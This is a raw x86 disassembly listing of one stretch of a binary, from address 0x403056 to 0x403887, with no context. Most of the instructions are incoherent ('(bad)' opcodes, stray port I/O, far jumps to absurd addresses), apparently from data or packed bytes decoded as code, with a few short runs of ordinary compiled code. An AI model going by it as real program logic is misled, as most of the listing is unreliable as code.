  403056:	sub    DWORD PTR [edi-0x4386b0d],0xb
  40305d:	or     BYTE PTR [edi-0x6c323b2f],dh
  403063:	es dec esi
  403065:	sbb    cl,BYTE PTR [ecx-0x4bf5d0ac]
  40306b:	loopne 0x4030b3
  40306d:	fwait
  40306e:	sub    al,BYTE PTR [eax-0x32]
  403071:	jmp    0x23b8b3d2
  403076:	stc    
  403077:	aad    0x76
  403079:	and    al,bl
  40307b:	dec    ebp
  40307c:	scas   eax,DWORD PTR es:[edi]
  40307d:	push   edx
  40307e:	dec    ebp
  40307f:	(bad)  
  403080:	mov    eax,ds:0x44efd984
  403085:	xor    al,0xba
  403087:	and    al,0x4a
  40308a:	push   0xa1899d2e
  40308f:	cmp    ch,0x31
  403092:	ss je  0x403045
  403095:	add    esp,edx
  403097:	push   esi
  403098:	mov    al,0xe8
  40309a:	iret   
  40309b:	retf   0x6976
  40309e:	jmp    0xe6a5ebb5
  4030a3:	rol    DWORD PTR [ebx-0x59],1
  4030a6:	sub    eax,0xa5c38041
  4030ab:	xchg   BYTE PTR [ebx+0x384fcf76],ch
  4030b1:	stc    
  4030b2:	aas    
  4030b3:	mov    ecx,0x9c302889
  4030b8:	inc    edx
  4030b9:	push   esp
  4030ba:	dec    esi
  4030bb:	addr16 in al,0x97
  4030be:	and    esp,DWORD PTR [ebp-0x571d5f90]
  4030c4:	leave  
  4030c5:	inc    ebx
  4030c6:	or     BYTE PTR [eax+0x10],0x60
  4030ca:	pop    ss
  4030cb:	loope  0x40314a
  4030cd:	inc    ecx
  4030ce:	mov    edx,0x2b262347
  4030d3:	add    cl,0x4c
  4030d6:	sbb    ah,BYTE PTR [edx]
  4030d8:	outs   dx,BYTE PTR ds:[esi]
  4030d9:	push   ebx
  4030da:	and    al,BYTE PTR [ebp-0x61]
  4030dd:	push   ds
  4030de:	fldcw  WORD PTR [eax-0x42]
  4030e1:	mov    ds:0xc106526c,eax
  4030e6:	sub    BYTE PTR [edx+0x3d223f56],al
  4030ec:	das    
  4030ed:	xlat   BYTE PTR ds:[ebx]
  4030ef:	cmp    eax,0x110a0076
  4030f4:	sbb    DWORD PTR [ebx-0x1e251455],ebx
  4030fa:	popa   
  4030fb:	xchg   ebx,esi
  4030fd:	loop   0x403099
  4030ff:	imul   bl
  403101:	lds    edi,FWORD PTR [esp+edx*2-0x3e2a8258]
  403108:	cli    
  403109:	mov    ds:0xa1d2645e,eax
  40310e:	pop    ebp
  40310f:	retf   
  403110:	int3   
  403111:	sbb    ch,ah
  403113:	aad    0xbe
  403115:	sub    ebp,DWORD PTR [eax-0x154fe9bd]
  40311b:	dec    eax
  40311c:	(bad)  
  40311d:	dec    esp
  40311e:	jmp    0x58527a9f
  403123:	xchg   edi,eax
  403124:	or     al,0xc9
  403126:	pop    es
  403127:	jmp    0x7853:0x9bc8294f
  40312e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40312f:	rcr    DWORD PTR ds:0x31f3dd12,cl
  403135:	fs (bad) 
  403137:	xchg   edx,eax
  403138:	mov    ds:0x1897e00,al
  40313d:	mov    eax,DWORD PTR [ebp-0x24]
  403140:	mov    ecx,DWORD PTR [ebp-0x8]
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x9a
  40316d:	dec    edi
  40316e:	mov    al,0xaa
  403170:	mov    DWORD PTR ds:0x7d6f7e7e,edx
  403176:	jle    0x4031f6
  403178:	xchg   edx,eax
  403179:	rcr    ecx,1
  40317b:	stc    
  40317c:	inc    ecx
  40317d:	mov    dl,al
  40317f:	jmp    0x1abff55f
  403184:	stos   DWORD PTR es:[edi],eax
  403185:	push   0x6b050bc
  40318a:	pop    ds
  40318b:	std    
  40318c:	jno    0x403173
  40318e:	lea    edi,[ebp-0x6cce8711]
  403194:	out    dx,eax
  403195:	xor    cl,BYTE PTR [edi]
  403197:	out    0xf4,eax
  403199:	pop    es
  40319a:	sbb    edx,edi
  40319c:	mov    edi,0xa5751a4c
  4031a1:	adc    al,0xe9
  4031a3:	fimul  DWORD PTR [edx-0x5b]
  4031a6:	je     0x403129
  4031a8:	add    BYTE PTR [ebx+0x23],0xd7
  4031ac:	cdq    
  4031ad:	int    0xb8
  4031af:	add    eax,0x55f0cd2b
  4031b4:	stos   BYTE PTR es:[edi],al
  4031b5:	jb     0x403203
  4031b7:	xchg   ebx,eax
  4031b8:	sub    DWORD PTR [ecx-0x3fe56891],eax
  4031be:	adc    dh,BYTE PTR [edi-0x54]
  4031c1:	cs mov eax,0x588069e
  4031c7:	pop    ecx
  4031c8:	call   0x79fc:0x748a9d22
  4031cf:	push   cs
  4031d0:	sar    BYTE PTR [ebx],cl
  4031d2:	out    0xb6,al
  4031d4:	cmc    
  4031d5:	das    
  4031d6:	mov    ss,esi
  4031d8:	mov    eax,ds:0xed13779d
  4031dd:	mov    al,ds:0xdb9bfd2c
  4031e2:	cmp    DWORD PTR cs:[edi-0x60],0xa049fab7
  4031ea:	das    
  4031eb:	mov    eax,0xb9cc4698
  4031f0:	dec    eax
  4031f1:	dec    esp
  4031f2:	sar    edi,cl
  4031f4:	ss ret 
  4031f6:	sti    
  4031f7:	rcr    ecx,1
  4031f9:	and    DWORD PTR [edx-0x73],0x2c
  4031fd:	in     al,0x41
  4031ff:	mov    eax,0x4397f631
  403204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403205:	cmp    eax,0x5a97824
  40320a:	sbb    DWORD PTR [ebx-0x5e],ecx
  40320d:	pop    eax
  40320e:	bound  ecx,QWORD PTR [esi+0x27b1ce98]
  403214:	lock and DWORD PTR [edx-0x503ae0b3],0x8
  40321c:	jmp    0x2b0511bc
  403221:	mov    edx,0xdc7e2c58
  403226:	stos   BYTE PTR es:[edi],al
  403227:	push   esi
  403228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403229:	sbb    edx,DWORD PTR [esi]
  40322b:	dec    edi
  40322c:	or     BYTE PTR [ecx],dh
  40322e:	sub    ah,al
  403230:	fucom  st(3)
  403232:	push   ecx
  403233:	out    0x46,eax
  403235:	cs sahf 
  403237:	adc    edx,DWORD PTR [ebp+ecx*4+0x66558ae]
  40323e:	dec    ebp
  40323f:	mov    ebx,0xa97d051c
  403244:	cmp    al,0xe4
  403246:	ins    DWORD PTR es:[edi],dx
  403247:	ficom  DWORD PTR [eax+ebx*1]
  40324a:	lahf   
  40324b:	daa    
  40324c:	pusha  
  40324d:	jecxz  0x40322f
  40324f:	mov    cs,WORD PTR [ebp+eax*1+0x430a8584]
  403256:	add    al,0x12
  403258:	xchg   edi,eax
  403259:	and    al,0x7e
  40325b:	jbe    0x403284
  40325d:	lock adc dh,BYTE PTR [eax+ecx*2+0x48ed519d]
  403265:	dec    ebx
  403266:	cmp    al,0xaf
  403268:	jmp    0x51c01d56
  40326d:	inc    ebx
  40326e:	jb     0x403263
  403270:	cld    
  403271:	repz data16 mov ah,0xf4
  403275:	dec    edi
  403276:	pop    ss
  403277:	sbb    DWORD PTR ss:[ecx],ebx
  40327a:	push   ebp
  40327b:	test   BYTE PTR [eiz*2+0x5361c39b],0x90
  403283:	xchg   esi,eax
  403284:	int    0xbb
  403286:	cld    
  403287:	jnp    0x403266
  403289:	sbb    ebx,DWORD PTR [edi+0x7c]
  40328c:	adc    eax,0xe2e49963
  403291:	mov    bl,0xab
  403293:	pop    ss
  403294:	push   ds
  403295:	mov    edx,0xeef29fbf
  40329a:	sbb    dh,BYTE PTR [esi+0x57cd0312]
  4032a0:	in     al,0xc6
  4032a2:	xor    al,0x69
  4032a4:	aad    0xe7
  4032a6:	call   0x455d:0x79ef441e
  4032ad:	and    eax,0xc57a9e57
  4032b2:	mov    dl,0x77
  4032b4:	test   eax,0xe83a4d5b
  4032b9:	and    edi,DWORD PTR [ecx]
  4032bb:	mov    esp,0x7ae11cc2
  4032c0:	clc    
  4032c1:	into   
  4032c2:	pop    edx
  4032c3:	push   ss
  4032c4:	sbb    eax,0x7516ceaa
  4032c9:	push   0x49da896e
  4032ce:	xchg   BYTE PTR fs:[edx+0x2e],ah
  4032d2:	(bad)  
  4032d3:	cld    
  4032d4:	out    0x97,al
  4032d6:	push   edi
  4032d7:	mov    ds:0x2341578d,eax
  4032dc:	adc    ecx,DWORD PTR [edx]
  4032de:	xor    ebx,edi
  4032e0:	jecxz  0x4032e6
  4032e2:	xchg   ebx,eax
  4032e3:	(bad)  
  4032e4:	xor    al,bl
  4032e6:	push   0x889c296d
  4032eb:	adc    al,BYTE PTR [eax-0x1a85bb71]
  4032f1:	loopne 0x403353
  4032f3:	cs mov al,0x8
  4032f6:	xchg   edx,eax
  4032f7:	xor    BYTE PTR [ebx+0x3cd26fb7],0xcb
  4032fe:	shl    DWORD PTR [edx-0x50],1
  403301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403302:	pop    esp
  403303:	inc    edx
  403304:	and    DWORD PTR [ebp-0x71],ebx
  403307:	mov    al,0x80
  403309:	outs   dx,BYTE PTR ds:[esi]
  40330a:	mov    ecx,0xd7677418
  40330f:	lahf   
  403310:	jmp    0x403327
  403312:	jmp    0x28b648e9
  403317:	jae    0x403340
  403319:	adc    bh,BYTE PTR [eax+edx*1-0x66e95e69]
  403320:	into   
  403321:	add    eax,0x1c7f9fdf
  403326:	mov    ds:0x8a86672,al
  40332b:	lahf   
  40332c:	popf   
  40332d:	mov    ds:0xc1837a01,al
  403332:	and    ebx,DWORD PTR [eax]
  403334:	aaa    
  403335:	inc    ebp
  403336:	add    DWORD PTR [ecx-0x4c],0x72880eca
  40333d:	push   edi
  40333e:	dec    ebp
  40333f:	adc    DWORD PTR [esi+0x446f336c],0x6e2a0b6d
  403349:	mov    ebx,0xc06cb66b
  40334e:	inc    ebx
  40334f:	out    dx,eax
  403350:	std    
  403351:	sar    BYTE PTR [ebp-0x3c158c86],cl
  403357:	or     BYTE PTR [edx+0x7875f794],0x8f
  40335e:	xchg   ebp,eax
  40335f:	scas   eax,DWORD PTR es:[edi]
  403360:	mov    ss,WORD PTR [esi+0x6172e168]
  403366:	cmp    ah,BYTE PTR [ebx+0x3e71df7]
  40336c:	fmul   DWORD PTR [edi+0x64c45ac2]
  403372:	popa   
  403373:	and    BYTE PTR [eax],bh
  403375:	pop    esi
  403376:	rep outs dx,DWORD PTR ds:[esi]
  403378:	mov    ebx,0xd1e6745b
  40337d:	fimul  WORD PTR [eax]
  40337f:	xor    eax,0x91fa48db
  403384:	pop    ebx
  403386:	fist   DWORD PTR [ebp-0x4a]
  403389:	xchg   edi,eax
  40338a:	xor    edx,esi
  40338c:	repnz adc al,0x47
  40338f:	xor    eax,0x2df96885
  403394:	gs jmp 0x6ff3:0x21d0e809
  40339c:	in     eax,dx
  40339d:	pop    esp
  40339e:	sahf   
  40339f:	sbb    ebp,DWORD PTR ds:[edx-0x115ae549]
  4033a6:	cmp    ch,dl
  4033a8:	inc    edi
  4033a9:	xor    DWORD PTR [edi+edi*8+0x26fc96c3],ebx
  4033b0:	aaa    
  4033b1:	sub    al,0xf5
  4033b3:	rcl    DWORD PTR [ebx],0x59
  4033b6:	imul   eax,DWORD PTR [edx-0x6d],0xffffff8a
  4033ba:	(bad)  
  4033bb:	gs data16 ja 0x403357
  4033bf:	jmp    0x70b0:0x5c7230d7
  4033c6:	and    al,0xbc
  4033c8:	push   0x2b
  4033ca:	jmp    0xa0ff:0xe6cbe0a3
  4033d1:	icebp  
  4033d2:	fiadd  WORD PTR [ebx]
  4033d4:	or     eax,0x90c1931a
  4033d9:	lahf   
  4033da:	push   edi
  4033db:	cli    
  4033dc:	mov    WORD PTR [eax],?
  4033de:	push   ebp
  4033df:	push   0x1f7f115c
  4033e4:	shl    DWORD PTR [ebp-0x44],1
  4033e7:	pop    edi
  4033e8:	mov    edx,0x2b1633d4
  4033ed:	dec    edx
  4033ee:	xchg   ebx,eax
  4033ef:	shr    BYTE PTR [esi+0xf4e7862],0xa4
  4033f6:	enter  0xe969,0x5b
  4033fa:	out    dx,eax
  4033fb:	int3   
  4033fc:	or     ebx,ecx
  4033fe:	mov    bl,0xa1
  403400:	inc    edi
  403401:	cmp    eax,edi
  403403:	xchg   DWORD PTR [eax+0x53],edi
  403406:	fcmovnbe st,st(5)
  403408:	cli    
  403409:	dec    ebx
  40340a:	cmp    DWORD PTR [edx+eiz*4-0x3a],edi
  40340e:	pop    esi
  40340f:	xor    bl,BYTE PTR [eax+0x415524a7]
  403415:	mov    edx,0xe3b00fce
  40341a:	test   BYTE PTR [ebx],ah
  40341c:	inc    ebp
  40341d:	test   BYTE PTR [edi],dl
  40341f:	fidivr DWORD PTR [ebp+0x31]
  403422:	(bad)  [ecx-0x5c]
  403425:	xchg   ebx,eax
  403426:	cmp    DWORD PTR [ecx+0x41],ebp
  403429:	lea    esp,[eax-0x50]
  40342c:	pop    edi
  40342d:	dec    esp
  40342e:	pop    DWORD PTR [edi-0x4205d091]
  403434:	or     DWORD PTR [eax-0x5892d3dd],ebp
  40343a:	jmp    0x8c1:0x6b0d8d8f
  403441:	sub    DWORD PTR [edi+0x3b],eax
  403444:	test   al,0x1f
  403446:	and    ah,dh
  403448:	inc    esi
  403449:	and    ebx,DWORD PTR [ecx-0x69]
  40344c:	and    ebp,DWORD PTR [ecx+0x3f1bcfca]
  403452:	mov    ?,WORD PTR [edx-0x2aec2604]
  403458:	shl    BYTE PTR ds:0x8f0ea77d,0xa6
  40345f:	(bad)
  403462:	iret   
  403463:	into   
  403464:	add    al,0x2a
  403466:	or     eax,DWORD PTR [eax+ecx*1]
  403469:	call   0xa3fda07f
  40346e:	pop    ebp
  40346f:	jnp    0x40342d
  403471:	xchg   eax,ecx
  403473:	fwait
  403474:	dec    eax
  403476:	sbb    eax,0x7b6966d9
  40347b:	enter  0x5256,0x24
  40347f:	and    edi,ebx
  403481:	or     BYTE PTR [ecx],bl
  403483:	push   ss
  403484:	jp     0x40344d
  403486:	frstor [ecx+0x516b8185]
  40348c:	or     eax,0xe7f9779c
  403491:	cmp    ebp,DWORD PTR [ebp+0x19b7a767]
  403497:	dec    esi
  403498:	add    cl,ch
  40349a:	add    ah,al
  40349c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40349d:	(bad)  
  40349e:	aad    0x18
  4034a0:	iret   
  4034a1:	push   ecx
  4034a2:	ins    BYTE PTR es:[edi],dx
  4034a3:	and    al,0x3c
  4034a5:	fld    TBYTE PTR [edx]
  4034a7:	iret   
  4034a8:	lods   al,BYTE PTR ds:[esi]
  4034a9:	and    DWORD PTR [ecx],ebx
  4034ab:	(bad)  
  4034ad:	cmp    eax,DWORD PTR [edx+0x78]
  4034b0:	sbb    al,0xea
  4034b2:	push   ecx
  4034b3:	inc    esi
  4034b4:	push   edi
  4034b5:	leave  
  4034b6:	and    ecx,ebx
  4034b8:	mov    bh,0xb7
  4034ba:	mov    edi,0x7514c631
  4034bf:	clc    
  4034c0:	pop    ebx
  4034c1:	in     eax,dx
  4034c2:	push   0x39
  4034c4:	aam    0xf6
  4034c6:	pop    esi
  4034c7:	stos   BYTE PTR es:[edi],al
  4034c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034c9:	out    dx,al
  4034ca:	and    ebx,DWORD PTR [eax]
  4034cc:	call   0xa70f:0xb5105805
  4034d3:	call   0x59ce2bb
  4034d8:	(bad)  
  4034da:	cwde   
  4034db:	or     DWORD PTR [eax-0x12807df5],ecx
  4034e1:	jns    0x403524
  4034e3:	xor    ebp,DWORD PTR [ebp+0x4b90fe28]
  4034e9:	mov    ecx,0x4bacb1f7
  4034ee:	xchg   ecx,eax
  4034ef:	cli    
  4034f0:	test   BYTE PTR [esi+edi*8],0x73
  4034f4:	mov    eax,0x2fbd0ca2
  4034f9:	call   0xec45:0x9edfb8e8
  403500:	add    cl,BYTE PTR [eax-0x24]
  403503:	shl    DWORD PTR [esi-0x53],1
  403506:	adc    eax,edx
  403508:	and    edi,DWORD PTR ds:0x40c7d2ed
  40350e:	mov    ds:0xfffcf6f8,eax
  403513:	pop    ecx
  403514:	imul   esp,DWORD PTR [edi-0x10],0xfffffffb
  403518:	xor    eax,0x27ac0569
  40351d:	fnstenv [eax]
  40351f:	test   DWORD PTR [esi-0x30f3b42],edx
  403525:	test   eax,0x8f852808
  40352a:	ins    DWORD PTR es:[edi],dx
  40352b:	neg    BYTE PTR [eax+0x6073acf2]
  403531:	cwde   
  403532:	pop    edx
  403533:	inc    ebx
  403534:	mov    DWORD PTR [eax-0x60f1371],edx
  40353a:	(bad)  
  40353b:	nop
  40353c:	add    cl,BYTE PTR [ebx]
  40353e:	sub    BYTE PTR [edx+0x1447a28c],bh
  403544:	pop    ebp
  403545:	jnp    0x403527
  403547:	int3   
  403548:	scas   eax,DWORD PTR es:[edi]
  403549:	addr16 fwait
  40354b:	adc    DWORD PTR [ecx-0x76da40c5],eax
  403551:	cdq    
  403552:	xchg   edi,edx
  403554:	sbb    DWORD PTR [eax*4+0x1c11154f],ebx
  40355b:	stos   DWORD PTR es:[edi],eax
  40355c:	sar    DWORD PTR [eax],0x85
  40355f:	sar    edi,1
  403561:	or     eax,ecx
  403563:	and    al,0xb8
  403565:	mov    ds:0x8bcb605c,eax
  40356a:	dec    ebp
  40356b:	clc    
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	adc    DWORD PTR [ecx],ebx
  403599:	lods   eax,DWORD PTR ds:[esi]
  40359a:	sti    
  40359b:	xchg   BYTE PTR [ecx],dl
  40359d:	jle    0x40361d
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	jge    0x403620
  4035a2:	jle    0x40355f
  4035a4:	xchg   edi,eax
  4035a5:	add    edx,DWORD PTR [ebx]
  4035a7:	sub    BYTE PTR [esi],al
  4035a9:	pushf  
  4035aa:	mov    edx,0x949297e5
  4035af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035b0:	aam    0x82
  4035b2:	loop   0x40355a
  4035b4:	mov    al,0xbf
  4035b6:	mov    DWORD PTR [ebx],edx
  4035b8:	push   ss
  4035b9:	cld    
  4035ba:	push   ebx
  4035bb:	pop    ds
  4035bc:	inc    edx
  4035bd:	je     0x403617
  4035bf:	push   cs
  4035c0:	and    DWORD PTR [edx],0xecb9cc26
  4035c6:	inc    ebp
  4035c7:	push   edi
  4035c8:	and    ebp,DWORD PTR [edi+0x20]
  4035cb:	retf   
  4035cc:	ss jnp 0x4035d5
  4035cf:	outs   dx,BYTE PTR ds:[esi]
  4035d0:	and    DWORD PTR [ebp-0x7a9c0469],0xcbdbc698
  4035da:	or     BYTE PTR [eax],bh
  4035dc:	lahf   
  4035dd:	dec    edi
  4035de:	jbe    0x4035a8
  4035e0:	call   0xb5c9c1d
  4035e5:	std    
  4035e6:	xchg   edi,eax
  4035e7:	jns    0x403662
  4035e9:	(bad)  
  4035ea:	sbb    al,al
  4035ec:	push   es
  4035ed:	sbb    ecx,edx
  4035ef:	adc    al,0xe8
  4035f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035f2:	cmp    ebp,eax
  4035f4:	ins    DWORD PTR es:[edi],dx
  4035f5:	call   0xbf210339
  4035fa:	adc    dx,WORD PTR [edx]
  4035fd:	mov    al,0xe4
  4035ff:	mov    ebx,0x7f31d1d0
  403604:	(bad)
  403608:	cmp    al,BYTE PTR [edi+0x2]
  40360b:	xchg   ecx,eax
  40360c:	scas   al,BYTE PTR es:[edi]
  40360d:	mov    ebx,0x1f91ab40
  403612:	ret    
  403613:	cmp    DWORD PTR ds:0x55e9c865,ebp
  403619:	inc    ebx
  40361a:	adc    ecx,DWORD PTR [edi+0x2f3cd8ad]
  403620:	mov    ds:0x57b383d9,eax
  403625:	xchg   edx,eax
  403626:	mov    ds:0xf2950884,eax
  40362b:	pop    ebx
  40362c:	mov    DWORD PTR ds:0x6805e781,edi
  403632:	adc    ebp,DWORD PTR [esi+0x7a365962]
  403638:	outs   dx,DWORD PTR ds:[esi]
  403639:	pop    esi
  40363a:	inc    eax
  40363b:	outs   dx,DWORD PTR ds:[esi]
  40363c:	les    ebp,FWORD PTR cs:[ebp*2+0x25ff47ed]
  403644:	call   0x55846db4
  403649:	adc    eax,0x65243b9e
  40364e:	lds    esi,FWORD PTR [edi-0x70d4fa4d]
  403654:	push   0x47
  403656:	and    BYTE PTR [ebx+eax*1+0x2c1398d8],dh
  40365d:	hlt    
  40365e:	cmp    al,0xd8
  403660:	imul   esp,DWORD PTR [edx],0xffffff89
  403663:	add    bx,WORD PTR [edx]
  403666:	push   ebp
  403667:	xlat   BYTE PTR ds:[ebx]
  403668:	out    0x55,al
  40366a:	not    ebp
  40366c:	js     0x403651
  40366e:	bound  ebp,QWORD PTR [edx+0x29]
  403671:	push   cs
  403672:	mov    cl,0x79
  403674:	pop    edx
  403675:	pop    es
  403676:	adc    al,0x1c
  403678:	xchg   edi,eax
  403679:	mov    ah,0x9b
  40367b:	jmp    0x5155:0xd0cc43dd
  403682:	pop    es
  403683:	mov    bh,0x96
  403685:	mov    ah,0x2a
  403687:	add    ah,BYTE PTR [esi]
  403689:	test   DWORD PTR [ebx+edx*1+0x2e2986b5],esp
  403690:	icebp  
  403691:	pushw  cs
  403693:	or     al,0x15
  403695:	xlat   BYTE PTR ds:[ebx]
  403696:	(bad)  [edi]
  403698:	xor    BYTE PTR [edi],bh
  40369a:	and    al,0xee
  40369c:	and    BYTE PTR [ebp-0x50287ff8],dh
  4036a2:	(bad)  
  4036a4:	mov    ah,0x43
  4036a6:	in     eax,0x22
  4036a8:	push   0xfffffff6
  4036aa:	test   eax,0xb53545
  4036af:	(bad)  
  4036b0:	out    0xf9,al
  4036b2:	gs mov al,0x6b
  4036b5:	and    ch,BYTE PTR [ecx+0x44a556f8]
  4036bb:	and    esi,edi
  4036bd:	lock push esp
  4036bf:	pavgb  mm6,QWORD PTR [ebp+eiz*4-0x24d3d120]
  4036c7:	xchg   BYTE PTR [esi+0xa],al
  4036ca:	pusha  
  4036cb:	imul   eax,esp,0x1d
  4036ce:	jbe    0x403710
  4036d0:	mov    bh,0x2d
  4036d2:	mov    ebp,0xfff66630
  4036d7:	(bad)  
  4036d8:	js     0x403674
  4036da:	push   ebp
  4036db:	push   ebp
  4036dc:	ins    DWORD PTR es:[edi],dx
  4036dd:	and    eax,0x6e73b1ce
  4036e2:	inc    ebx
  4036e3:	sti    
  4036e4:	fld    QWORD PTR [ecx-0x3a63edfb]
  4036ea:	cmc    
  4036eb:	and    BYTE PTR [eax-0x6f],dl
  4036ee:	pop    ecx
  4036ef:	and    dh,dh
  4036f1:	jns    0x403684
  4036f3:	mov    ah,0x34
  4036f5:	int3   
  4036f6:	mov    bl,0xda
  4036f8:	jge    0x4036ff
  4036fa:	lods   al,BYTE PTR ds:[esi]
  4036fb:	sub    BYTE PTR [edi],ch
  4036fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036fe:	loopne 0x40369b
  403700:	not    DWORD PTR [edx-0x80]
  403703:	retf   0xf715
  403706:	retf   
  403707:	mov    edi,DWORD PTR ds:0x96d5010f
  40370d:	inc    edx
  40370e:	stc    
  40370f:	pushf  
  403710:	retf   
  403711:	(bad)  
  403712:	fisttp QWORD PTR [esp+ecx*4+0x43a420a5]
  403719:	jne    0x40371d
  40371b:	in     al,0xda
  40371d:	push   ss
  40371e:	pop    eax
  40371f:	or     ah,cl
  403721:	(bad)  
  403722:	jno    0x403750
  403724:	aas    
  403725:	pop    ebp
  403726:	shl    DWORD PTR [edx+0x364d82c7],cl
  40372c:	aad    0x71
  40372e:	es xchg edi,eax
  403730:	sbb    bh,BYTE PTR [ebp-0x573ba1f]
  403736:	loope  0x4036f8
  403738:	dec    edi
  403739:	or     al,0x27
  40373b:	repnz bound edi,QWORD PTR [esi-0x5f]
  40373f:	mov    DWORD PTR [ebp-0x3b72e063],eax
  403745:	mov    esi,edi
  403747:	jle    0x4037c7
  403749:	clc    
  40374a:	shl    DWORD PTR [edi-0x76],1
  40374d:	mov    ds:0xcd820ec8,eax
  403752:	jmp    0x403745
  403754:	test   al,0x2d
  403756:	mov    al,ds:0xd09dd9b4
  40375b:	mov    ds:0xe9d367b8,al
  403760:	(bad)  
  403761:	in     eax,dx
  403762:	imul   ecx,DWORD PTR [edx+esi*4],0x38
  403766:	addr16 mov edx,0xd036c31d
  40376c:	imul   esi,DWORD PTR ds:0xf7a399c6,0xd0aa5931
  403776:	mov    BYTE PTR [ecx+0x2f210329],cl
  40377c:	inc    ecx
  40377d:	nop
  40377e:	cmp    BYTE PTR [esi],cl
  403780:	mov    al,ds:0x831ab3f1
  403785:	inc    ecx
  403786:	test   BYTE PTR [di+0x5b],bl
  40378a:	ret    0xf987
  40378d:	dec    edi
  40378e:	test   eax,0x6d2429b0
  403793:	popf   
  403794:	mov    dl,dl
  403796:	arpl   WORD PTR [esi+0x0],ax
  403799:	mov    ebx,0x8b9e9c2f
  40379e:	cwde   
  40379f:	mov    ebx,0x755b61ff
  4037a4:	mov    esi,0x804fffab
  4037a9:	hlt    
  4037aa:	adc    eax,0xd18bd95b
  4037af:	fst    QWORD PTR [ebx-0x53]
  4037b2:	clc    
  4037b3:	pop    ebx
  4037b4:	adc    BYTE PTR [ecx-0x7e705ac2],bh
  4037ba:	dec    esi
  4037bb:	enter  0x8558,0xc6
  4037bf:	adc    edi,DWORD PTR [esi+0x38]
  4037c2:	(bad)
  4037c5:	inc    ebp
  4037c6:	(bad)  
  4037c7:	icebp  
  4037c8:	pop    ebx
  4037c9:	out    0x34,eax
  4037cb:	fidiv  WORD PTR [ebp+ebp*8-0x4d]
  4037cf:	xor    DWORD PTR [edx-0x3a703e9],ebx
  4037d5:	sub    BYTE PTR [eax],ah
  4037d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037d8:	xchg   ebp,eax
  4037d9:	imul   ecx,DWORD PTR [eax-0x79],0xce20dcee
  4037e0:	xor    BYTE PTR [edx],0x6e
  4037e3:	out    dx,al
  4037e4:	and    edi,0x9f916fb2
  4037ea:	xchg   BYTE PTR [esi-0x78],al
  4037ed:	scas   eax,DWORD PTR es:[edi]
  4037ee:	pop    ecx
  4037ef:	loopne 0x403814
  4037f1:	fst    QWORD PTR [ecx-0x369961d6]
  4037f7:	cmp    ebp,esp
  4037f9:	push   ebp
  4037fa:	lods   eax,DWORD PTR ds:[esi]
  4037fb:	jbe    0x403859
  4037fd:	mov    edi,0xec7ddcb1
  403802:	ins    DWORD PTR es:[edi],dx
  403803:	ret    
  403804:	mov    al,ds:0xfc739698
  403809:	jne    0x4037a3
  40380b:	push   eax
  40380c:	jnp    0x403867
  40380e:	gs or  al,0xec
  403811:	jge    0x4037cc
  403813:	sti    
  403814:	fucomp st(5)
  403816:	test   BYTE PTR [ebx+0x22],0x44
  40381a:	data16 jg 0x403811
  40381d:	and    ah,BYTE PTR [esi-0x7f3e410d]
  403823:	cmp    ah,BYTE PTR [edi-0x19]
  403826:	(bad)  
  403827:	dec    DWORD PTR ds:0x8629b0c1
  40382d:	xor    ah,ch
  40382f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403830:	cwde   
  403831:	lds    edi,FWORD PTR [ecx]
  403833:	push   0xffffffeb
  403835:	push   0xf61cdb5f
  40383a:	jg     0x403896
  40383c:	ret    0xa09b
  40383f:	jo     0x4037c8
  403841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403842:	test   BYTE PTR [ebx-0x3b],bh
  403845:	adc    eax,DWORD PTR [ecx]
  403847:	jnp    0x40384f
  403849:	cmp    bl,BYTE PTR [edx+0x1d3ebe6d]
  40384f:	adc    DWORD PTR [ecx+0x672bf11c],ecx
  403855:	rcr    DWORD PTR [edi-0x773db6ea],0x47
  40385c:	cmp    eax,DWORD PTR [edi]
  40385e:	xchg   edx,eax
  40385f:	out    dx,eax
  403860:	lods   eax,DWORD PTR ds:[esi]
  403861:	icebp  
  403862:	and    esi,DWORD PTR [esi]
  403864:	sbb    ecx,esp
  403866:	test   DWORD PTR [edi-0x41],ebp
  403869:	ret    
  40386a:	dec    eax
  40386b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40386c:	fistp  DWORD PTR [edi]
  40386e:	jne    0x4038c4
  403870:	xchg   DWORD PTR [edi],edi
  403872:	fidivr WORD PTR gs:[eax-0x1c58e150]
  403879:	(bad)  [edi]
  40387b:	mov    edx,DWORD PTR [eax+0x246c316c]
  403881:	xchg   esi,eax
  403882:	add    edi,ebp
  403884:	mov    bl,0x5f
  403886:	lahf   
  403887:	cmp    al,0x57
